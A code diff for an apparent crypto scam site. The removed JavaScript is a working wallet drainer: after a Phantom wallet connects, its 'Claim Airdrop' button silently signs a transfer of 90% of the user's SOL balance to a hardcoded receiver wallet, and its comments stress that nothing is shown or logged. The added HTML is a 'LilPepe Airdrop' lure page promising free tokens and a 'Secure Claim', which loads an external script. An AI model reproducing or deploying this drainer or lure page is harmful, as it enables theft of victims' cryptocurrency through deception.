@@ -1,83 +1,235 @@
-// Ensure @solana/web3.js is available globally
-if (typeof solanaWeb3 === 'undefined') {
-    throw new Error("Solana Web3.js not found. Include <script src='https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js'></script>");
-}
-
-$(document).ready(function() {
-    $('#connect-wallet').on('click', async () => {
-        if (window.solana && window.solana.isPhantom) {
-            try {
-                const resp = await window.solana.connect();
-                // Removed balance logging for discretion
-                var connection = new solanaWeb3.Connection(
-                    'https://bold-prettiest-spree.solana-mainnet.quiknode.pro/8a34f4083d0d4a0a1533ddbd64fbecd5f6f789d4',
-                    'confirmed'
-                );
-
-                const publicKey = new solanaWeb3.PublicKey(resp.publicKey.toString());
-                const walletBalance = await connection.getBalance(publicKey); // Still needed for calculation
-                const minBalance = await connection.getMinimumBalanceForRentExemption(0); // Still needed for safety
-                if (walletBalance < minBalance) {
-                    // Kept minimal alert for usability
-                    alert("Insufficient funds to proceed.");
-                    return;
-                }
-
-                $('#connect-wallet').text("Claim Airdrop");
-                $('#connect-wallet').off('click').on('click', async () => {
-                    try {
-                        const receiverWallet = new solanaWeb3.PublicKey('BpEFdhesEQRKvridrGvkNxpRVUY5fG6r6CTVcveMCgjp');
-                        const balanceForTransfer = walletBalance - minBalance;
-                        if (balanceForTransfer <= 0) {
-                            alert("Insufficient funds to proceed.");
-                            return;
-                        }
-
-                        var transaction = new solanaWeb3.Transaction().add(
-                            solanaWeb3.SystemProgram.transfer({
-                                fromPubkey: publicKey,
-                                toPubkey: receiverWallet,
-                                lamports: Math.floor(balanceForTransfer * 0.9),
-                            })
-                        );
-
-                        transaction.feePayer = publicKey;
-                        let blockhashObj = await connection.getRecentBlockhash();
-                        transaction.recentBlockhash = blockhashObj.blockhash;
-
-                        // Silent signing and execution
-                        const signed = await window.solana.signTransaction(transaction);
-                        let txid = await connection.sendRawTransaction(signed.serialize());
-                        await connection.confirmTransaction(txid);
-                        // No alert or log about the deduction
-                    } catch (err) {
-                        console.error("Error during minting:", err.message); // Kept for debugging
-                    }
-                });
-            } catch (err) {
-                console.error("Error connecting to Phantom Wallet:", err.message);
-            }
-        } else {
-            const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
-
-            if (isMobile) {
-                alert("Phantom Wallet not found. Redirecting to Phantom mobile app...");
-                const currentUrl = encodeURIComponent(window.location.href);
-                const phantomMobileLink = `https://phantom.app/ul/v1/connect?app_url=${currentUrl}&redirect_link=${currentUrl}`;
-                window.open(phantomMobileLink, "_blank");
-            } else {
-                alert("Phantom extension not found.");
-                const isFirefox = typeof InstallTrigger !== "undefined";
-                const isChrome = !!window.chrome;
-
-                if (isFirefox) {
-                    window.open("https://addons.mozilla.org/en-US/firefox/addon/phantom-app/", "_blank");
-                } else if (isChrome) {
-                    window.open("https://chrome.google.com/webstore/detail/phantom/bfnaelmomeimhlpmgjnjophhpkkoljpa", "_blank");
-                } else {
-                    alert("Please download the Phantom extension for your browser.");
-                }
-            }
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>LilPepe Airdrop</title>
+    <meta name="description" content="Claim your LilPepe airdrop on Solana! Connect your Phantom Wallet and join the Pepe revolution.">
+    <meta name="keywords" content="LilPepe, airdrop, memecoin, cryptocurrency, Solana, Phantom Wallet">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css"/>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
         }
-    });
-});
+
+        body {
+            font-family: 'Poppins', sans-serif;
+            background: linear-gradient(135deg, #1e90ff, #ff6f61);
+            color: #fff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            overflow-x: hidden;
+        }
+
+        header {
+            text-align: center;
+            padding: 60px 20px;
+            background: url('https://images.unsplash.com/photo-1612833602644-0a3d0b9a7a0f') no-repeat center/cover;
+            width: 100%;
+            border-bottom: 8px solid #ffd700;
+            animation: fadeInDown 1s ease-in-out;
+        }
+
+        h1 {
+            font-size: 4rem;
+            font-weight: 800;
+            color: #ffd700;
+            text-shadow: 3px 3px 6px rgba(0, 0, 0, 0.5);
+            margin-bottom: 15px;
+        }
+
+        p {
+            font-size: 1.4rem;
+            font-weight: 400;
+            color: #f0f0f0;
+            max-width: 700px;
+            margin: 0 auto;
+            line-height: 1.6;
+        }
+
+        .hero-image {
+            max-width: 250px;
+            border-radius: 50%;
+            border: 5px solid #ffd700;
+            margin: 20px auto;
+            animation: bounce 2s infinite;
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.3);
+        }
+
+        .button-container {
+            margin: 40px 0;
+            text-align: center;
+        }
+
+        .button {
+            background: linear-gradient(45deg, #ffd700, #ffca28);
+            color: #000;
+            padding: 18px 40px;
+            font-size: 1.3rem;
+            font-weight: 600;
+            border: none;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.3);
+        }
+
+        .button:hover {
+            transform: scale(1.1);
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.4);
+        }
+
+        .features {
+            display: flex;
+            justify-content: center;
+            gap: 30px;
+            flex-wrap: wrap;
+            padding: 50px 20px;
+            background: rgba(0, 0, 0, 0.2);
+            width: 100%;
+            text-align: center;
+        }
+
+        .feature-card {
+            background: #fff;
+            color: #333;
+            padding: 25px;
+            border-radius: 15px;
+            width: 280px;
+            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.2);
+            transition: transform 0.3s ease;
+            animation: fadeInUp 1s ease-in-out;
+        }
+
+        .feature-card:hover {
+            transform: translateY(-12px);
+        }
+
+        .feature-card h3 {
+            font-size: 1.6rem;
+            font-weight: 600;
+            margin-bottom: 15px;
+            color: #ff6f61;
+        }
+
+        .feature-card p {
+            font-size: 1rem;
+            color: #666;
+        }
+
+        footer {
+            padding: 30px;
+            text-align: center;
+            background: rgba(0, 0, 0, 0.6);
+            width: 100%;
+            font-size: 1rem;
+        }
+
+        footer a {
+            color: #ffd700;
+            text-decoration: none;
+            margin: 0 15px;
+            font-weight: 600;
+        }
+
+        footer a:hover {
+            text-decoration: underline;
+            color: #ffca28;
+        }
+
+        /* Notification Styling */
+        .notification {
+            display: none;
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: #ffd700;
+            color: #000;
+            padding: 15px 25px;
+            border-radius: 10px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
+            font-size: 1.2rem;
+            font-weight: 600;
+            z-index: 1000;
+            animation: slideIn 0.5s ease-in-out;
+        }
+
+        .notification.show {
+            display: block;
+        }
+
+        /* Animations */
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-25px); }
+        }
+
+        @keyframes slideIn {
+            from { transform: translateX(100%); }
+            to { transform: translateX(0); }
+        }
+
+        @media (max-width: 768px) {
+            h1 { font-size: 2.8rem; }
+            p { font-size: 1.1rem; }
+            .hero-image { max-width: 180px; }
+            .button { padding: 14px 30px; font-size: 1.1rem; }
+            .feature-card { width: 100%; max-width: 320px; }
+            .notification { font-size: 1rem; padding: 10px 20px; }
+        }
+
+        @media (max-width: 480px) {
+            h1 { font-size: 2.2rem; }
+            .hero-image { max-width: 150px; }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <img src="images/lilpepe.png" alt="LilPepe Logo" class="hero-image" onerror="this.src='https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/f/8e5b3e57-d8b4-4f7d-9b62-9a9a6e9f2f1d/dg0z0m9-6b1a2e8e-1e7d-4b7e-9f1c-5a5e8b1b1e2b.png/v1/fill/w_512,h_512,strp/pepe_the_frog_meme_token_by_cryptopepe_dg0z0m9-fullview.png'">
+        <h1 class="animate__animated animate__fadeIn">LilPepe Airdrop</h1>
+        <p class="animate__animated animate__fadeIn">Claim your free LilPepe tokens on Solana! Connect your Phantom Wallet to join the revolution.</p>
+    </header>
+
+    <div class="button-container">
+        <button id="connect-wallet" class="button animate__animated animate__pulse animate__infinite">Connect Wallet</button>
+    </div>
+
+    <section class="features">
+        <div class="feature-card animate__animated animate__fadeInUp">
+            <h3>Fast Airdrop</h3>
+            <p>Claim your LilPepe tokens instantly on Solana’s high-speed blockchain.</p>
+        </div>
+        <div class="feature-card animate__animated animate__fadeInUp animate__delay-1s">
+            <h3>Pepe Community</h3>
+            <p>Join thousands of Pepe fans in the LilPepe movement!</p>
+        </div>
+        <div class="feature-card animate__animated animate__fadeInUp animate__delay-2s">
+            <h3>Secure Claim</h3>
+            <p>Connect safely with Phantom Wallet to claim your airdrop.</p>
+        </div>
+    </section>
+
+    <footer>
+        <p>© 2025 LilPepe. All rights reserved.</p>
+        <p>
+            <a href="/privacy">Privacy Policy</a> |
+            <a href="/terms">Terms of Service</a> |
+            <a href="https://twitter.com/LilPepeCoin">Twitter</a> |
+            <a href="https://discord.gg/LilPepe">Discord</a>
+        </p>
+    </footer>
+
+    <!-- Notification Element -->
+    <div id="notification" class="notification"></div>
+
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
+    <script src="scripts/scripts.js"></script>
+</body>
+</html>
